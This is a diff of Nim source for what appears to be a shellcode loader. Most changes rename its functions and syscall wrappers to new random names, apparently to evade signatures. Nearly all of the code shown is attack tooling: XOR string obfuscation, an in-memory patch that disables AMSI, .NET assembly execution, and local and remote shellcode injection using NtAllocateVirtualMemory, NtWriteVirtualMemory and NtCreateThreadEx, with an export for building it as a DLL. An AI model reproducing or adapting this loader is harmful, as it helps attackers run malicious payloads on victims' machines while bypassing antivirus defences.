@@ -42,7 +42,7 @@ import macros, hashes
 type
     estring = distinct string
 
-proc fWorgaKn0rg(s: estring, key: int): string {.noinline.} =
+proc calcTheThings(s: estring, key: int): string {.noinline.} =
     var k = key
     result = string(s)
     for i in 0 ..< result.len:
@@ -50,14 +50,14 @@ proc fWorgaKn0rg(s: estring, key: int): string {.noinline.} =
             result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
     k = k +% 1
 
-var encodedCounter {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFFF
+var eCtr {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFFF
 
-macro xorStrings*{s}(s: string{lit}): untyped =
+macro exOrAllString*{s}(s: string{lit}): untyped =
     if len($s) < 1000:
-        var encodedStr = fWorgaKn0rg(estring($s), encodedCounter)
+        var encodedStr = calcTheThings(estring($s), eCtr)
         result = quote do:
-            fWorgaKn0rg(estring(`encodedStr`), `encodedCounter`)
-        encodedCounter = (encodedCounter *% 16777619) and 0x7FFFFFFF
+            calcTheThings(estring(`encodedStr`), `eCtr`)
+        eCtr = (eCtr *% 16777619) and 0x7FFFFFFF
     else:
         result = s
 
@@ -129,17 +129,17 @@ when defined patchAmsi:
             var op: ULONG
             var pLen = cast[SIZE_T](aPatch.len)
             var sbPageAddr = sbAddr
-            var ret = ubtkgykehoOtMXRG(getCurrentProcess(), &sbPageAddr, &pLen, PAGE_EXECUTE_READWRITE, &op)
+            var ret = XnnlWrMywNrFZycU(getCurrentProcess(), &sbPageAddr, &pLen, PAGE_EXECUTE_READWRITE, &op)
             doAssert ret == 0, "Error executing NtProtectVirtualMemory when setting AMSI protections."
 
             # NtWriteVirtualMemory
             var bytesWritten: SIZE_T
-            ret = VfSxUkLKbMoGGBeT(getCurrentProcess(), sbAddr, unsafeAddr aPatch, aPatch.len, addr bytesWritten)
+            ret = HOdIFVAdjQWNamsW(getCurrentProcess(), sbAddr, unsafeAddr aPatch, aPatch.len, addr bytesWritten)
             doAssert ret == 0, "Error executing NtWriteVirtualMemory."
             
             # NtProtectVirtualMemory
             var t: ULONG
-            ret = ubtkgykehoOtMXRG(getCurrentProcess(), &sbPageAddr, &pLen, op, &t)
+            ret = XnnlWrMywNrFZycU(getCurrentProcess(), &sbPageAddr, &pLen, op, &t)
             doAssert ret == 0, "Error executing NtProtectVirtualMemory when restoring AMSI protections."
 
             disabled = true
@@ -183,7 +183,6 @@ when defined patchApiCalls:
 
 when defined executeAssembly:
     proc execAsm(decodedPay: openArray[byte]): void =
-        ################################# TODO - fix issue with below
         var assembly = load(decodedPay)
 
         # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let arr = toCLRVariant(["argument1", "argument2"], VT_BSTR)
@@ -201,12 +200,12 @@ when defined(shinject) or defined(patchApiCalls):
             # NtAllocateVirtualMemory
             var sc_size: SIZE_T = cast[SIZE_T](payload.len)
             var dest: LPVOID
-            var ret = tmNeIICXlJFvSEkq(getCurrentProcess(), &dest, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+            var ret = CkzEIpXrlBNcxNyG(getCurrentProcess(), &dest, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
             doAssert ret == 0, "Error executing NtAllocateVirtualMemory."
 
             # NtWriteVirtualMemory
             var bytesWritten: SIZE_T
-            ret = VfSxUkLKbMoGGBeT(getCurrentProcess(), dest, unsafeAddr payload, sc_size-1, addr bytesWritten)
+            ret = HOdIFVAdjQWNamsW(getCurrentProcess(), dest, unsafeAddr payload, sc_size-1, addr bytesWritten)
             doAssert ret == 0, "Error executing NtWriteVirtualMemory."
 
             when defined verbose:
@@ -234,7 +233,7 @@ when defined remoteShinject:
             # NtOpenProcess, get handle on remote process
             var rHandle: HANDLE
             var roa: OBJECT_ATTRIBUTES
-            var ret = ypSZHQjRZBuZvYgv(&rHandle, PROCESS_ALL_ACCESS, &roa, &rcid)
+            var ret = MSxlQNGtaQVDzcXz(&rHandle, PROCESS_ALL_ACCESS, &roa, &rcid)
             doAssert ret == 0, "Error executing NtOpenProcess (remote)."
             when defined verbose:
                 echo "[*] rHandle: ", rHandle
@@ -242,12 +241,12 @@ when defined remoteShinject:
             # NtAllocateVirtualMemory, allocate memory in remote thread
             var rBaseAddr: LPVOID
             var sc_size: SIZE_T = cast[SIZE_T](payload.len)
-            ret = tmNeIICXlJFvSEkq(rHandle, &rBaseAddr, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            ret = CkzEIpXrlBNcxNyG(rHandle, &rBaseAddr, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
             doAssert ret == 0, "Error executing NtAllocateVirtualMemory."
 
             # NtWriteVirtualMemory, write payload to remote thread
             var bytesWritten: SIZE_T
-            ret = VfSxUkLKbMoGGBeT(rHandle, rBaseAddr, unsafeAddr payload, sc_size-1, addr bytesWritten);
+            ret = HOdIFVAdjQWNamsW(rHandle, rBaseAddr, unsafeAddr payload, sc_size-1, addr bytesWritten);
             doAssert ret == 0, "Error executing NtWriteVirtualMemory."
             when defined verbose:
                 echo "[*] NtWriteVirtualMemory: ", ret
@@ -255,13 +254,13 @@ when defined remoteShinject:
 
             # NtCreateThreadEx, execute shellcode from memory region in remote thread
             var tHandle: HANDLE
-            ret = eTvGYJYHUrfXKwzj(&tHandle, THREAD_ALL_ACCESS, NULL, rHandle, rBaseAddr, NULL, FALSE, 0, 0, 0, NULL)
+            ret = VzJWdBdsTaqTGsey(&tHandle, THREAD_ALL_ACCESS, NULL, rHandle, rBaseAddr, NULL, FALSE, 0, 0, 0, NULL)
             doAssert ret == 0, "Error executing NtCreateThreadEx."
 
             # NtClose, close the handle
-            ret = NAdBghYPVEdFHrzq(rHandle)
+            ret = FiuxrPXNssolHiEa(rHandle)
             doAssert ret == 0, "Error executing NtClose (rHandle)."
-            ret = NAdBghYPVEdFHrzq(tHandle)
+            ret = FiuxrPXNssolHiEa(tHandle)
             doAssert ret == 0, "Error executing NtClose (tHandle)."
     else:
         # Remote shellcode injection using high-level APIs
@@ -315,7 +314,7 @@ when defined remoteShinject:
 
         iSR(decodedPay, tProcId)
 
-proc mainMain() : void =
+proc theMainFunction() : void =
 
     #[
         BELOW LINES WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE:
@@ -326,8 +325,7 @@ proc mainMain() : void =
         (key is defined separately as a const to prevent the values from being too close together)
     ]#
     #[ PLACEHOLDERCRYPTEDINPUT ]#
-    when defined patchApiCalls:
-        #[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#
+    #[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#
     #[ PLACEHOLDERCRYPTIV ]#
 
     when defined calcPrimes:
@@ -396,12 +394,12 @@ proc mainMain() : void =
 
 when defined exportExe:
     when isMainModule:
-        mainMain()
+        theMainFunction()
 
 when defined exportDll:
     proc NimMain() {.cdecl, importc.}
 
     proc Update(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
         NimMain()
-        mainMain()
+        theMainFunction()
         return true
